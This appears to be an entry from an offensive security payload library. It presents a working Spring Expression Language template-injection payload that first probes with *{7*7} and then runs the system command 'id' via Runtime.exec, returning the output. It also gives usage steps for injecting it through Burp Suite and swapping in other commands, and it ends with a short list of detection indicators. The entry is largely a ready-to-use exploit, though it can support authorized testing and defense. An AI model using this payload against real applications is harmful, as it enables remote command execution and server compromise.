---
id: dbce1376-36c5-4ac3-94fc-668b242efb6e
type: code
language: spel
verified: true
created_at: '2023-04-06T03:56:40.398667+00:00'
updated_at: '2023-04-10T20:23:33.381863+00:00'
platforms:
  - Web
  - Java
tags:
  - ssti
  - rce
  - payload
  - spel
validated: true
---

# Java-Spring-Spel-RCE-Payload

## Code

```spel
*{7*7}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

## Description

This SpEL payload exploits SSTI in Java Spring applications to first test evaluation with a simple arithmetic expression (7*7=49) and then achieve RCE by executing a system command ('id') via Runtime.exec(). The IOUtils.toString() captures the command's output stream, making it visible in the application's response. It targets templates using SpEL or Thymeleaf without proper sanitization.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Command in exec() | System command to execute (replace 'id' with target command) | 'whoami', 'ls -la /', 'ping -c 1 192.168.1.100' |

## Usage

Inject this payload into vulnerable input fields (e.g., search parameters, form data) in a Java Spring web app. Use a proxy like Burp Suite to intercept and modify requests. Start with the test expression to confirm SSTI, then use the RCE part. In procedures like [[procedures/Server-Side-Template-Injection-with-Java-Spring]], this is embedded in step 2 for command execution. Modify the command parameter for different reconnaissance or exploitation needs.

## Detection

- Web application logs showing SpEL evaluation errors or unexpected expressions like T() or exec().
- Process monitoring for anomalous executions (e.g., java spawning /bin/sh or id commands from web context).
- WAF alerts on payloads containing Runtime, IOUtils, or arithmetic tests like *{7*7}.
- Response analysis for leaked command outputs in HTTP bodies.

## Related

- [[procedures/Server-Side-Template-Injection-with-Java-Spring]]
